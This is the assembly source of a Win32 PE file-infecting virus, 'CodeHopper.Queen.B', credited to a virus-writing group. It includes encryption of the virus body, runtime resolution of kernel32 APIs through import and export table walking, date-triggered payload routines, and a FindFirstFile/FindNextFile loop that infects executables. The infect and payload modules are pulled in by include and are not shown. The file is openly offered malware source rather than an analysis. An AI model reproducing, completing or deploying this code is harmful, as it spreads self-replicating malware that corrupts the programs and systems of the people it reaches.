;CodeHopper.Queen.B Virus (AKA LisaBulz Virus)
;This Version (B)Has Some Features Removed (Polymorphics,Hybrid Technique,Payloads)
;I removed these because I moved on to other projects before I had a chance to
;complete them.
;いいいいいいいいいいいいいいいいいいいい
;Written By CodeMaster /Codex Vx Group
;Thanks To FunkyMonkey /Codex Vx Group For Help With Original Payload (Removed)
;
;VIRUS TYPE: Win32 PE Mid-Infector
;            Encryption(not strong)
;            slow infector
;いいいいいいいいいいいいいいいいいいいい
;nasm -f obj main.asm -o main.o   -g -F borland
;alink main.o win32.lib -o main.exe -oPE -base 0x400000 -m
;             ^ can replace with import32.lib or whatever
;                     
;                                   
;                                    
;                                         
;                              
[BITS 32]
%include "defines.asm"

EXTERN ExitProcess         
EXTERN GetModuleHandleA




[SECTION CODE USE32 CLASS=FLAT] 

..start:                      ;Entry Point

;Encrypt Main Virus Body
mov  EDX,START_OF_VIRUS
mov  ECX,END_OF_ENCRYPTION_BOUNDRY - START_OF_VIRUS
call Encrypt1stGen

jmp   Sentry_EntryPoint
;jmp  START_OF_VIRUS

Encrypt1stGen:
    mov Esi,Edx
    DEC ECX
.1:
    LODSB      
    XCHG AH,AL
    LODSB
    XOR AL,AH  
    DEC ESI
    MOV [ESI],AL
    LOOP .1
    RET



START_OF_VIRUS:
    
    
    call GetDeltaHandle
GetDeltaHandle:
    pop  ebp
    sub  ebp,GetDeltaHandle
    
    mov  eax,[ebp+OriginalIP] ;Mov OriginalIP into JumpIP
    mov  [ebp+JumpIP],eax     ;
    
    
    
    ;Restore Sentry Original SectionData
    cmp  [ebp+PayloadBDA],DWORD 0        ;Is There Data That Needs To Be Swaped?
    je   .4
    mov  esi,[ebp+SentryBDA]             ;Get BDA Within Host 
    lea  edi,[ebp+Sentry_BlockDescryptor];Get Original Block Address
    mov  eax,[ebp+SentryBDA]             ;Get BDA
    mov  ecx,[eax+BLOCKDESCRYPTOR_BLOCKSIZE] ;Get Block Size In ECX
    call ExchangeData                    ;Make The Exchange
.4:
    
    ;Restore Payload Original SectionData
    cmp  [ebp+PayloadBDA],DWORD 0        ;Is There Data That Needs To Be Swaped?
    je   .1                              ;Skip Past If Not
    mov  esi,[ebp+PayloadBDA]            ;Get BDA Within Host
    lea  edi,[ebp+Payload_BlockDescryptor];Get Original Block Address
    cmp  [ebp+DroneFlag],DWORD 0         ;Is This A Queen Generation
    je   .3
    lea  edi,[ebp+PayloadDrone_BlockDescryptor];If Not The Load Drone Payload
.3:
    
    mov  eax,[ebp+PayloadBDA]            ;Get BDA
    mov  ecx,[eax+BLOCKDESCRYPTOR_BLOCKSIZE] ;Get Block Size In ECX
    call ExchangeData                    ;Make The Exchange
.1:
    
    
    ;Restore Infect Block Original SectionData
    cmp  [ebp+InfectBDA],DWORD 0         ;Is There Data That Needs To Be Swaped?
    je   .2                              ;Skip Past If Not
    mov  esi,[ebp+InfectBDA]             ;Get BDA Within Host
    lea  edi,[ebp+Infect_BlockDescryptor];Get Buffer Address
    
    mov  eax,[ebp+InfectBDA]            ;Get BDA
    mov  ecx,[eax+BLOCKDESCRYPTOR_BLOCKSIZE] ;Get Block Size In ECX
    call ExchangeData                    ;Make The Exchange
.2:
    
    
    
    
    MOV ESI,[EBP+ImageBase]

    CMP [ESI],WORD 0x5a4d     ;Verify MZ Exe File
    JMPNE Abort               ;exit if not

    add  esi,0x3c             ;pointer to header (relative to start of file)
    mov  esi,[esi]            ;get it
    add  esi,[EBP+ImageBase]  ;add image base address
    
    cmp  WORD [esi],'PE'      ;is it the PE header
    JMPNE Abort               ;exit if not
    
    add  esi,80h                   ;goto location of import directory address
    mov  eax,[esi]                 ;get import directory RVA
    add  eax,[ImageBase+ebp]       ;add base address
    mov  [ebp+importvirtual],eax   ;save address <<
    
    add  esi,4                     ;goto location of import directory size
    mov  eax,[esi]                 ;get import directory size
    mov  [ebp+importsize],eax      ;save size

    ;Decrypt
    ;mov  EDX,ENCRYPT_REGION0_BEGIN
    ;mov  ECX,ENCRYPT_REGION0_END - ENCRYPT_REGION0_BEGIN
    ;call DeZigZor 

ENCRYPT_REGION0_BEGIN:
    
;Search The Import Directory For Kernel32.dll
    mov  esi,[ebp+importvirtual]   ;Reload Import Directory Address
    mov  edx,[ebp+importvirtual]   ;Reload Import Directory Address
    add  edx,[ebp+importsize]      ;Add Import Directory Size To Create Import Directory Limit
    
FindKernel32:
    cmp  [esi+12],DWORD 0          ;Make Sure This Entry Isnt The NULL Terminator
    JMPE Abort                     ;Abort When We've Searched All But Found Nothing

    call VerifyKernel32
    jc   Kernel32Located           ;Kernel32 Import Has Been Found
    add  esi,20                    ;mov to next entry
    cmp  esi,edx                   ;verify that we havn't gone passed the limit
    jb   .1                        
    jmp  Abort                     ;we have so terminate
.1:   
    jmp  FindKernel32
Kernel32Located:




;ESI points to kernel32.dll IMAGE_IMPORT_DESCRIPTOR structure
;DWORD OriginalFirstThunk (Import Names)
;DWORD TimeDateStamp
;DWORD ForwarderChain
;DWORD Name (Name RVA)
;DWORD FirstThunk (Imported Function Pointers)


;Search The Kernel32 Imports For GetModuleHandleA
;NOTE: FirstThunk Points To An Array Of Adresses Of The _REAL_ Functions
;      OriginalFirstThunk Points To An Array Of IMAGE_IMPORT_BY_NAME structures
;      Containing The Functions Name.

    mov  [ebp+K32directoryentry],esi         ;Save Address Of The Kernel32 Import Directory Entry 
    mov  eax,[esi]                           ;Get OriginalFirstThunk Member Of Kernel32 Import Entry    
    cmp  eax,0                               ;If No RVA Of IMAGE_THUNK_DATA Structure Then Kernel32 Probably Imports By Ordinal
    jne  .2
    call RunPayload
    jmp  Abort                               ;Abort If Ordinals
.2:
    
    add  eax,[ebp+ImageBase]                 ;Add Image Base
    mov  [ebp+K32firstthunk],eax             ;Save Address Of OriginalFirstThunk
    mov  esi,[ebp+K32firstthunk]             ;ESI now points to the OriginalFirstThunk structure
    
    
    
    cmp  esi,0                               ;Safety Check
    jne  .1
    jmp  Abort                               ;
.1:
    
    ;ESI points to an array of IMAGE_THUNK_DATA structures.
    ;The Last of which is equal to 0.
    ;an IMAGE_THUNK_DATA structure is just a DWORD that 

    ;points to a IMAGE_IMPORT_BY_NAME structure
FindGetModuleHandle:
    cmp  [esi],DWORD 0                       ;If This Is The Terminating Entry Then Abort
    jne  .1
    jmp  Abort 
.1:
    call VerifyGetModuleHandle               ;Check If This Is The One
    jc   GetModuleHandleLocated              ;If It Is
    add  esi,4                               ;Move To Next Entry
    
    jmp  FindGetModuleHandle                 ;Scan Next Entry
    
GetModuleHandleLocated:                      ;The Hard Bit Is Over
   
        
             
                  
                       
                            
                                 
                                      



                                           
     
    sub  esi,[ebp+K32firstthunk]             ;This Will Leave Us With The Offset Into The Thunk Table
    mov  eax,[ebp+K32directoryentry]         ;Load The Kernel32 Import Directory Entry
    mov  eax,[eax+16]                        ;Load The Address Of The FirstThunk Table (Not OriginalFirstThunk)
    
    add  eax,[ebp+ImageBase]                 ;Add ImageBase
    add  esi,eax                             ;And Add The Offset Of The GetModuleHandleA Thunk Entry
    
    mov  eax,[esi]
    mov  [ebp+K32GetModuleHandleA],eax       ;Save The Address Of The GetModuleHandleA Entry Point
    
;Now Get The Handle Of The Kernel32.dll Module
    lea  edx,[Kernel32Name+ebp]
    push edx
    call eax                                 ;eax still points to the GetModuleHandleA Entry Point
    
    cmp  eax,0
    jne  .1
    jmp  Abort                               ;Abort On Fail
.1:
    mov  [ebp+Kernel32ModuleHandle],eax      ;Save It
   
;Verify Kernel32.dll Magic Word Signatures (PE0/0/,ZM)
    cmp  [eax], WORD 0x5A4D                  ;Check ZM/MZ Signature
    je   .2
    jmp  Abort                               ;Abort If False
.2:
    add  eax,0x3c
    mov  eax,[eax]
    add  eax,[Kernel32ModuleHandle+ebp]
    cmp  [eax],WORD 'PE'                     ;Check PE Signature
    je   .3
    jmp  Abort                               ;Abort If False
.3:

ENCRYPT_REGION0_END:

    ;Decrypt
    ;mov  EDX,ENCRYPT_REGION1_BEGIN
    ;mov  ECX,ENCRYPT_REGION1_END - ENCRYPT_REGION1_BEGIN
    ;call DeZigZor 

ENCRYPT_REGION1_BEGIN:

;Go Deep Into The Kernel32's PE Headers And Retrieve The 
;GetProcAdressA Function Export
    add  eax,0x78                            ;Export Directory RVA
    mov  esi,[eax]                           ;Load Address
    add  esi,[ebp+Kernel32ModuleHandle]      ;And Normalize With Kernel Base
    mov  [ebp+K32exportdirectory],esi        ;Save It
    
    add  esi,24                              ;Move To Number Of Names Field   
    mov  eax,[esi]                           ;Get It
    mov  [ebp+K32numberofnames],eax          ;Save It
    
    add  esi,4                               ;Move To Address Of Functions Field
    mov  eax,[esi]                           ;Get It
    add  eax,[ebp+Kernel32ModuleHandle]      ;Add Kernel32 Module Base
    mov  [ebp+K32exportfunctions],eax        ;Save It
    
    add  esi,4                               ;Move To Address Of Names Field
    mov  eax,[esi]                           ;Get It
    add  eax,[ebp+Kernel32ModuleHandle]      ;Add Kernel32 Module Base
    mov  [ebp+K32exportnames],eax            ;Save It
    
    add  esi,4                               ;Move To Address Of Name Ordinals Field
    mov  eax,[esi]                           ;Get It
    add  eax,[ebp+Kernel32ModuleHandle]      ;Add Kernel32 Module Base
    mov  [ebp+K32exportordinals],eax         ;Save It
    
    mov  esi,[ebp+K32exportnames]            ;Load K32exportnames
    mov  ecx,[ebp+K32numberofnames]
    
;Search The Exported Names For GetProcAddress
FindGetProcAddress:

    push esi                                 ;Save ESI
    push ecx
    mov  esi,[esi]                           ;Get RVA Of This Name
    add  esi,[ebp+Kernel32ModuleHandle]      ;Make RVA a VA
    lea  edi,[ebp+GPA_NAME]
    mov  ecx,15                              ;15 Characters
    call CompareString                       ;Is This The Wright One
    pop  ecx
    pop  esi                                 ;Restore ESI
    jc   GetProcAddressLocated

    add  esi,4                               ;Next Entry
    loop FindGetProcAddress
    jmp  Abort
    
    
GetProcAddressLocated:
    sub  esi,[ebp+K32exportnames]            ;This Will Leave Us With The Index Into The Function Name Array
    shr  esi,1                               ;Divide By Two (Ordinals Array Is 16bit Not 32bit)
    add  esi,[ebp+K32exportordinals]         ;Now Indexed Into Ordinals ()
    
    xor  eax,eax                             ;clear eax
    mov  ax,[esi]                            ;Get The Index Into The Function Address Array (16bit)
    mov  esi,4                               ;Multiply By 4 (32bit DWORD Array)
    mul  esi                                 ;EAX = EAX * ESI
    add  eax,[ebp+K32exportfunctions]        ;EAX Is Now An Address Into The Array
    
    mov  eax,[eax]                           ;Get The Functions RVA <
    add  eax,[ebp+Kernel32ModuleHandle]      ;Make The RVA a VA
    
    mov  [ebp+K32GetProcAddress],eax         ;Save The Functions Virtual Address
    
    

    
;LOC1    

    
    DebugMarker
    call  GetImportFunctions                  ;Imports All The Required APIs With GetProcAddress
    JMPNC Abort                               ;CarryFlag Not Set On Error
    
    DebugMarker

    lea  eax,[ebp+SystemTime]                ;Get The Effective Address Of SYSTEMTIME Structure
    push eax                                 ;Push It Onto The Stack
    call [ebp+K32GetSystemTime]              ;Call GetSystemTime
    
    
    
    ;Drone Payload
    cmp  [ebp+DroneFlag],WORD 0              ;Is This A Queen Generation
    je   NotTimeForDronePayload              ;If So Then Skip
    cmp  [ebp+ST_Month],WORD 10              ;Is It October?
    jne  NotTimeForDronePayload
    cmp  [ebp+ST_Day],WORD 23                ;Is The Day >= 23rd
    jb   NotTimeForDronePayload              ;Skip If Not
    cmp  [ebp+ST_Day],WORD 30                ;Is The Day <= 30th
    ja   NotTimeForDronePayload              ;Skip If Not
    call RunPayload                          ;Run The Payload
NotTimeForDronePayload:
    
    ;Queen Payload
    cmp  [ebp+DroneFlag],WORD 0              ;Is This A Queen Generation
    jne  NotTimeForQueenPayload              ;Skip If Not
    cmp  [ebp+ST_Month],WORD  9              ;Is It September
    jne  NotTimeForQueenPayload              ;Skip If Not
    cmp  [ebp+ST_Day],WORD 12                ;Is It My Favourite Day (13th)
    jne  NotTimeForQueenPayload              ;Skip If Not
    cmp  [ebp+ST_Hour],WORD 1                ;Is It 1PM/1AM
    jne  NotTimeForQueenPayload              ;Skip If Not
    call RunPayload                          ;Run The Payload
NotTimeForQueenPayload:

    DebugMarker
    DebugMarker

    ;Drone Infection
    cmp  [ebp+DroneFlag],WORD 0              ;Is This A Queen Generation
    je   NotTimeForDroneInfection            ;Skip If So
    cmp  [ebp+ST_Month],WORD 6               ;Is It June
    jb   NotTimeForDroneInfection            ;Skip If Month < June
    cmp  [ebp+ST_Month],WORD 9               ;Is It September
    ja   NotTimeForDroneInfection            ;Skip If Month > September
    ;call SaveCurrentDirectory
    ;call SetTargetDirectory
    call InfectFiles                         ;Search For And Infect Files
    ;call RestoreCurrentDirectory
NotTimeForDroneInfection:

    ;Queen Infection
    cmp  [ebp+DroneFlag],WORD 0              ;Is This A Queen Generation
    jne  NotTimeForQueenInfection            ;Skip If Not
    cmp  [ebp+ST_Month],WORD 5               ;Is It May
    jne  NotTimeForQueenInfection            ;Skip If Not
    call InfectFiles                         ;Search For And Infect Files
NotTimeForQueenInfection:
    
    
    
    

Abort:

    mov  eax,[ebp+JumpIP]                    ;Load The Value Of The Original IP
    add  eax,[ebp+ImageBase]                 ;Add The Image Base
    jmp  eax
    
Abort2:
    pop eax                                  ;Remove Return Address
    jmp Abort

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Routines
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;ESI: Pointer To Import Directory Entry
;Case Insensitive
VerifyKernel32:
    push esi
    
    mov  esi,[esi+12]             ;ESI = DLL Name (RVA)
    add  esi,[ebp+ImageBase]      ;Add Image Base Address
    lea  edi,[ebp + Kernel32Name] ;EDI will point to the string we want to compare against
    mov  ecx,13                   ;13 Characters (Kernell32.dll+0)
    call CompareString
    pop  esi
    ret

;ESI = string1
;EDI = string2 (string2 must all be upper case!)
;ECX = string2 Length
CompareString:
    push esi
    push ds
    push cs
    pop  ds
    
.1:;Compare Loop
    lodsb             ;Load A Character
    mov  ah,[edi]     ;Load A Character From String
    inc  edi          ;Increment EDI
    
    cmp  ah,al
    je   .4           ;equal so continue loop
    cmp  ah,0
    je   .2           ;end of string so return error
    cmp  ah,al        ;fail if ah > al
    ja   .2           ;fail if so
    
    add  ah,32        ;lower case test
    cmp  al,ah
    jne  .2           ;not equal in lower case either so fail
.4
    LOOP .1
    
.3:;found it
    pop  ds
    pop  esi
    STC               ;Set Carry Flag
    ret
.2:;error
    pop  ds
    pop  esi
    CLC               ;Clear Carry Flag
    ret


;edi == ImageBase



;ESI = address 
;Carry Flag Set On Success
VerifyGetModuleHandle:
    push esi
    
    mov  esi,[esi]                           ;Get Address of IMAGE_IMPORT_BY_NAME structure (what the FirstThunk Structur Point To)
    add  esi,[ebp+ImageBase]                 ;ESI now points to the IMAGE_IMPORT_BY_NAME structure
    add  esi,2                               ;ESI now points to the function name (Contained Within The IMAGE_IMPORT_BY_NAME structure)
    lea  edi,[ebp+GMHA_NAME]                 ;GetModuleHandleA ASIIZ string
    mov  ecx,17                              ;17 Characters
    call CompareString                       ;Is It The Wright One
    
    pop  esi
    ret

    ;45 E (ExitProcess)
    ;47 G 65 e 74 t 4d M 6f o 64 d 75 u 6c l 65 e 48 H 61 a 6e n 64 d  
    ;(GetModuleHandleA)
    
;Scans ImportArray And Files Function Addresses
;ESI = ImportArray Virtual Address (real address)
;EBP = Respective Block Descryptors Address
;EDX = Address Of GetProcAddressA
;EBX = Modules Base
ScanImportArray:
    lodsd       ;First DWORD of ImportArray Is Number Of Imports
    mov ecx,eax ;Put In ECX
    
.1:
    lodsd           ;Load Name Address
    add   eax,ebp   ;Add BDA
    
    pusha           ;SAVE ALL REGISTERS
    push  esi       ;SAVE ESI
    
    push  eax       ;Address Of Function Name
    push  ebx       ;Push Module Base
    call  edx       ;Call GetProcAddressA
    
    or    eax,eax
    jz    .2        ;Check For Error
    
    pop   esi       ;RESTORE ESI
    mov   [esi],eax ;Save Function Address
    popa            ;RESTORE ALL REGISTERS
    add   esi,4     ;Update ESI
    
    LOOP .1         ;Loop While ECX
    CLC             ;No Carry Flag On No Error
    RET
.2:
    STC             ;Carry Flag On Error
    RET
    
;Imports Address Of Functions With GetProcAddress
GetImportFunctions:
    mov  ecx,NumberOfImports
.1:
    mov  eax,ecx  ;Make Eax Index Into Array
    push  ecx     ;Save ECX
    
    dec  eax      ;
    mov  edx,4    ;
    mul  edx      ;EAX = (ECX-1) * 4
    add  eax,ebp  ;add DeltaOffset Here
    
    push eax      ;save index
    add  eax,ImportNames
    mov  eax,[eax];Get The Strings Address
    add  eax,ebp  ;Add Delta Offset
    
    push  eax                              ;Address Of Module Name
    push  DWORD [ebp+Kernel32ModuleHandle] ;Push Module Base
    call  [K32GetProcAddress+ebp]          ;call GetProcAddress
    
    pop   edx                              ;restore index
    add   edx,ImportAddresses              ;edx now points to an entry in the ImportAddresses Array
    mov   [edx],eax                        ;Save The Functions Address Into The Array
    
    pop   ecx     ;Restore ECX
    or    eax,eax
    jz    .2                               ;EAX == 0 On Error
    
    loop .1
    
    STC                                    ;Set CarryFlag On No Error
    ret
.2:
    CLC                                    ;Clear CarryFlag On Error
    ret

    

    

;Search For Files To Infect
SearchHandle           DD 0                    ;

;NewEntryPoint          DD 0                    ;New Entry Point Of Host (Virus Entry)
;SectionDifference      DD 0 ;
;NewFileSize            DD 0 ;

    FindData:
    FD_FileAttributes          DD 0               ; attributes
    FD_CreationTime_Low        DD 0               ; time of creation
    FD_CreationTime_High       DD 0               ; time of creation
    FD_LastAccessTime_Low      DD 0               ; last access time
    FD_LastAccessTime_High     DD 0               ; last access time
    FD_LastWriteTime_Low       DD 0               ; last modificationm
    FD_LastWriteTime_High      DD 0               ; last modificationm
    FD_FileSizeHigh            DD 0               ; filesize
    FD_FileSizeLow             DD 0               ; -"-
    FD_Reserved0               DD 0               ;
    FD_Reserved1               DD 0               ;
    FD_FileName                TIMES max_path DB 0; long filename
    FD_AlternateFileName       TIMES 13 DB 0      ; short filename
    FD_Padding                 TIMES 3  DB 0      ; dword padding

InfectFiles:

    ;Process ImportArray For Payload
    push ebp                             ;SAVE EBP
    lea  eax,[ebp+Infect_BlockDescryptor];Load BDA
    mov  esi,[eax+BLOCKDESCRYPTOR_IMPORTARRAY];Get BDR ImportArray Address
    add  esi,eax                         ;Add BDA
    mov  edx,[K32GetProcAddress+ebp]     ;GetProcAddressA
    mov  ebx,[Kernel32ModuleHandle+ebp]  ;USER32 Module Base
    mov  ebp,eax                         ;EBP = BDA
    call ScanImportArray                 ;Scan An ImportArray
    pop  EBP                             ;RESTORE EBP
    
    jc   .2                              ;On Error


    lea  eax,[ebp + FindData]   ;Pass Search Record
    push eax
    lea  eax,[ebp + FileMask]   ;Pass File Mask
    push eax
    Call FindFirstFileA         ;Call FindFirstFile Function
    mov  [ebp+SearchHandle],eax ;Save File Handle
    cmp  eax,0                  ;Return On Error
    je   .2
    cmp  eax,0xFFFFFFFF         ;Return On No Files Found
    je   .2
    
    mov  ecx,MAX_INFECTIONS     ;Maximum Infections Per Run For A Drone Generation
    cmp  [ebp+DroneFlag],DWORD 0;Is This A Queen Generation
    JMPNE .IntoInfectLoop       ;If Not Then Go Into Infect Loop Now
    mov  ecx,2                  ;If It Is Then Their Should Be A Maximum Of Two Infections Per Run
    jmp  .IntoInfectLoop        ;Go In Now
    
    
    
    
    
    
    
    ;Search Through Files
.InfectionLoop:
    push ecx            ;SAVE ECX
    lea  eax,[ebp + FindData]     ;Pass Search Record
    push eax
    push DWORD [ebp+SearchHandle] ;Pass Handle Of Search
    call FindNextFileA            ;Call FindNextFile Function
    pop  ecx            ;RESTORE ECX
    or eax,eax
    jz .2
    cmp eax,0xFFFFFFFF
    je .2

    ;Now Infect The File
.IntoInfectLoop:
    push ecx            ;SAVE ECX
    ;Call The Infect Block
    lea  eax,[ebp+Infect_BlockDescryptor];Get Block Descryptor Address
    push ebp                             ;SAVE EBP
    mov  edx,ebp                         ;Global Delta Offset
    mov  ebp,eax                         ;The Block Descryptor Address
    add  eax,BLOCKDESCRYPTOR_ENTRYPOINT  ;Add Entry Point
    call eax                             ;Call Entry Point
    pop  ebp                             ;RESTORE EBP
    pop  ecx            ;RESTORE ECX
    
    loop .InfectionLoop                  ;
    
    
    
    .2:
    ret                         ;Return


;Runs The Payload
RunPayload:
    ;Load USER32.DLL With LoadLibrary
    lea  eax,[ebp+USER32name]
    push eax                           ;Push Module Name
    call [ebp+K32LoadLibraryA] 
    mov  [ebp+USER32base],eax          ;Save Module Handle/Base
    cmp  eax,0
    JMPE SkipPayload                   ;Abort On Error
    
    ;Process ImportArray For Payload
    push ebp                           ;SAVE EBP
    lea  eax,[ebp+Payload_BlockDescryptor];Load BDA For Queen Payload
    cmp  [ebp+DroneFlag],DWORD 0       ;Is This A Queen Generation
    je   .2
    lea  eax,[ebp+PayloadDrone_BlockDescryptor];If Not Then Load BDA For Drone Payload
.2:
    
    
    mov  esi,[eax+BLOCKDESCRYPTOR_IMPORTARRAY];Get BDR ImportArray Address
    add  esi,eax                       ;Add BDA
    mov  edx,[K32GetProcAddress+ebp]   ;GetProcAddressA
    mov  ebx,[USER32base+ebp]          ;USER32 Module Base
    mov  ebp,eax                       ;EBP = BDA
    call ScanImportArray               ;Scan An ImportArray
    pop  EBP                           ;RESTORE EBP
    jc   SkipPayload                   ;On Error

    ;Call Payload
    lea  eax,[ebp+Payload_BlockDescryptor];Get Block Descryptor Address
    cmp  [ebp+DroneFlag],DWORD 0          ;Is This A Queen Generation
    je   .1
    lea  eax,[ebp+PayloadDrone_BlockDescryptor];If Not Then Load Drone Payload
.1:
    push ebp                             ;SAVE EBP
    mov  ebp,eax                         ;The Block Descryptor Address
    add  eax,BLOCKDESCRYPTOR_ENTRYPOINT  ;Add Entry Point
    call eax                             ;Call Entry Point
    pop  ebp                             ;RESTORE EBP
    
    ;Unload USER32.dll
SkipPayload:
    push DWORD [USER32base+ebp]
    call [ebp+K32FreeLibrary]
    
    RET
    




;Exchange Two Regions Of Data
;ESI = Region 1
;EDI = Region 2
;ECX = Number Of Bytes To Copy
ExchangeData:
.1:
    mov  DH  ,[esi]          ;Exchagne Bytes
    mov  DL  ,[edi]
    mov  [esi],DL
    mov  [edi],DH
    
    inc  esi                   ;Increment ESI
    inc  edi                   ;Increment EDI
    loop .1                    ;Loop For All Bytes
    RET

;On Entry:
;ESI = Address To Relocate To
;ECX = Block Size
;EDX = Global Delta Offset
;EBP = Infect Blocks Local Delta Ofsset (Block Delta)
InfectHostSpace  DD 0 ;Infect Block In Host Space
InfectVirusSpace DD 0 ;Infect Block In Virus Space
InfectBlockSize  DD 0 ;Infect Block Size
InfectDelta      DD 0 ;Infect BDA
RelocateInfectBlock:
    PUSHAD                                  ;SAVE ALL 32Bit REGISTERS
    ;save data for return of infectection block
    mov [edx+InfectHostSpace],ESI
    mov [edx+InfectBlockSize],ECX
    mov [edx+InfectDelta],EBP
    
    ;swap infect block to HOST space
    lea  edi,[edx+Infect_BlockDescryptor]
    mov [edx+InfectVirusSpace],EDI
    call ExchangeData                       ;exchange it
    
    POPAD                                   ;RESTORE ALL 32Bit REGISTERS
    
    ;modify ebp
    mov  eax,ebp
    mov  ebp,esi                            ;Set New Block Delta (BDA)
    
    ;return to infect block in HOST space
    pop  ebx       ;Get Return Address
    sub  ebx,eax   ;Subtract BDA
    add  ebx,esi   ;Add New BDA
    
    push ebx       ;Set New Return Address
    ret
    
;On Entry:
;EDX = Global Delta Offset
ReturnInfectBlock:
    ;copy infect block back to VIRUS space
    mov  esi,[edx+InfectHostSpace]    ;Source
    mov  edi,[edx+InfectVirusSpace]   ;Destination
    mov  ecx,[edx+InfectBlockSize]    ;Size
    push edi                          ;SAVE EDI
    push esi                          ;SAVE ESI
    rep  movsb                        ;Copy It
    pop  ESI                          ;RESTORE ESI
    pop  EDI                          ;RESTORE EDI
    
    ;modify ebp
    mov  ebp,edi                      ;Original Infect BDA
    
    ;return to infect block in V space
    pop  ebx        ;Get Return Address
    sub  ebx,esi    ;Subtract Infect Blocks Base
    add  ebx,edi    ;Add Base Of Infect Block In Virus Space
    push ebx        ;Save New Return Address
    ret
    
;SaveCurrentDirectory:
;    push DWORD SD_BUFFER            ;Size Of String Buffer
;    lea  eax,[ebp+SavedDirectory]   ;Address Of String Buffer
;    push eax                        
;    call GetCurrentDirectoryA       ;Get Current Directory
;    mov  [ebp+RestoreDirectory],eax ;save return status
;    RET

;TargetDir1 DB "c:\windows\desktop\",0
;TargetDir2 DB "c:\my documents\",0
;SD_BUFFER       EQU 300
;SavedDirectory  TIMES SD_BUFFER+1 DB 0
    
;RestoreCurrentDirectory:
;    mov  eax,[ebp+RestoreDirectory]
;    cmp  eax,0
;    RETE
;    lea  eax,[ebp+SavedDirectory]   ;Address Of String Buffer
;    push eax                            
;    call SetCurrentDirectoryA       ;Set Current Directory
;    RET


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;Data
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;Block Descryptor Addresses
PayloadBDA DD 0 ;Payload BDA Within Host Space
InfectBDA  DD 0 ;Infect BDA Within Host Space
SentryBDA  DD 0 ;Sentry BDA Within Host Space


KERNELL32            DD 0 ;Handle Of The Kernell 32 Module
importvirtual        DD 0 ;Virtual Adress Of Import Directory  401004
importsize           DD 0 ;Size Of Import Directory            401008
ImageBase            DD IMAGE_BASE                            ;40100c
K32firstthunk        DD 0 ;
K32directoryentry    DD 0 ;
Kernel32Name         DB "KERNEL32.DLL",00
USER32name           DB "USER32.DLL",00
Kernel32ModuleHandle DD 0 ;Handle Of The Kernel32.dll Module (Base Address)
USER32base           DD 0 ;Handle Of The User32.dll Module
K32exportdirectory   DD 0 ;Address Of The Kernel32.dll Export Directory
K32exportnames       DD 0 ;
K32exportfunctions   DD 0 ;
K32exportordinals    DD 0 ;
K32numberofnames     DD 0 ;Number Of Functions Exported By Name
OriginalIP           DD TERMINAL_FUNCTION - IMAGE_BASE ;(0xFFFFFFFF - IMAGE_BASE) + TERMINAL_FUNCTION
JumpIP               DD 0 ;
OldSectionSize       DD 0 ;
NewSectionSize       DD 0 ;
FileMask             DB "*.EX_",0
;FileMask             DB "*.EXE",0 ;For EXE Infection
DroneFlag            DD 0 ;Set If This Generation Is A Drone

SystemTime:
ST_Year         DW 0
ST_Month        DW 0
ST_DayOfWeek    DW 0
ST_Day          DW 0
ST_Hour         DW 0
ST_Minute       DW 0
ST_Second       DW 0
ST_MilliSeconds DW 0


;Import Stuff
GMHA_NAME            DB "GETMODULEHANDLEA",0   ;This Is Retrieved From This PEs Import Table
GPA_NAME             DB "GETPROCADDRESS",0     ;This Is Retrieved From The Kernels Export Table (Kernel32.dll)
K32GetModuleHandleA     DD 0 ;
K32GetProcAddress       DD 0 ;

GetProcAddress_NAME DB "GetProcAddress",0

FFFA_NAME            DB "FindFirstFileA",0
FNFA_NAME            DB "FindNextFileA",0
SCDA_NAME            DB "SetCurrentDirectoryA",0
GCDA_NAME            DB "GetCurrentDirectoryA",0
LLA_NAME             DB "LoadLibraryA",0
FL_NAME              DB "FreeLibrary",0
GST_NAME             DB "GetSystemTime",0

ImportNames: ;Requires Delta Offset
FFFA_NAMEA           DD FFFA_NAME           
FNFA_NAMEA           DD FNFA_NAME           
SCDA_NAMEA           DD SCDA_NAME           
GCDA_NAMEA           DD GCDA_NAME
LLA_NAMEA            DD LLA_NAME
FL_NAMEA             DD FL_NAME
GST_NAMEA            DD GST_NAME

ImportAddresses:
K32FindFirstFileA       DD 0 ;
K32FindNextFileA        DD 0 ;
K32SetCurrentDirectoryA DD 0 ;
K32GetCurrentDirectoryA DD 0 ;
K32LoadLibraryA         DD 0 ;
K32FreeLibrary          DD 0 ;
K32GetSystemTime        DD 0 ;

_ImportAddresses:       DD 0 ;
NumberOfImports EQU  ((_ImportAddresses - ImportAddresses) / 4)

DB "<MARK>"

END_OF_ENCRYPTION_BOUNDRY:

%include "infect.asm"    
NASMHACKI
%include "payloadd.asm"
NASMHACKPD
%include "sentry.asm"
NASMHACKS

;Queen Specific Code
%include "payloadq.asm"

    
END_OF_VIRUS:    


TERMINAL_FUNCTION:
    push DWORD 0
    call ExitProcess


end segment CODE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

CreateHybridFile:
     
    RET
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;




